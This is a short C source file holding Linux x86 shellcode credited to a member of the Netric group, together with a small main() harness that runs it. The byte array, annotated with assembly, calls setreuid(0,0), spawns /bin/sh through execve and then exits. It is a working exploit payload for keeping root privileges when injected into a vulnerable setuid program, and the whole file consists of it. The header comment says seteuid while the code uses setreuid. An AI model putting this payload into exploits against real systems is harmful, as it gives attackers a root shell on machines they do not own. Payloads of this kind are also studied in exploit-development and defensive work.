/* linux x86 shellcode by eSDee of Netric (www.netric.org)
 * seteuid(0,0); execve /bin/sh; exit;
 */  

#include <stdio.h>

char
shellcode[]=

        // setreuid(0,0);
        "\x31\xc0"                      // xor    %eax,%eax
        "\x31\xdb"                      // xor    %ebx,%ebx
        "\x31\xc9"                      // xor    %ecx,%ecx
        "\xb0\x46"                      // mov    $0x46,%al
        "\xcd\x80"                      // int    $0x80

        // execve /bin/sh
        "\x31\xc0"                      // xor    %eax,%eax
        "\x50"                          // push   %eax
        "\x68\x2f\x2f\x73\x68"          // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"          // push   $0x6e69622f
        "\x89\xe3"                      // mov    %esp,%ebx
        "\x8d\x54\x24\x08"              // lea    0x8(%esp,1),%edx
        "\x50"                          // push   %eax
        "\x53"                          // push   %ebx
        "\x8d\x0c\x24"                  // lea    (%esp,1),%ecx
        "\xb0\x0b"                      // mov    $0xb,%al
        "\xcd\x80"                      // int    $0x80

        // exit();
        "\x31\xc0"                      // xor    %eax,%eax
        "\xb0\x01"                      // mov    $0x1,%al
        "\xcd\x80";                     // int    $0x80

int
main()
{
        void (*funct) ();
        (long) funct = &shellcode;
        funct();
}